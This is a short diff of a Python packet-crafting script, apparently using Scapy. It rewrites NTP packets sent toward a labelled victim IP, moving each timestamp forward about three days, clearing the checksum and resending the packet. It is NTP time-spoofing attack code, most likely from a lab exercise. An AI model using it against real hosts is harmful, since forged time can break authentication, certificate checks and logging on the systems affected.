@@ -10,11 +10,12 @@ victim_ip = "10.10.10.10"
 def send_ntp(server, packet):
     print('here')
     ntp_packet = packet
+    del ntp_packet.chksum
     print("incoming packet")
     #ntp_packet.show()
     print()
 
-    #ntp_packet[NTP].ref = ref_timestamp
+    ntp_packet[NTP].ref = ntp_packet[NTP].ref + 259201
     ntp_packet[NTP].orig = ntp_packet[NTP].ref + 259201
     ntp_packet[NTP].recv = ntp_packet[NTP].ref + 259201
     ntp_packet[NTP].sent = ntp_packet[NTP].ref + 259201
@@ -28,6 +29,7 @@ def send_ntp(server, packet):
     #    print("new checksum: " + str(ntp_packet[UDP].chksum))
     #else:
     #    print("Packet does not contain UDP layer")
+    ntp_packet = ntp_packet.build()
     send(ntp_packet, verbose=True)
 
 
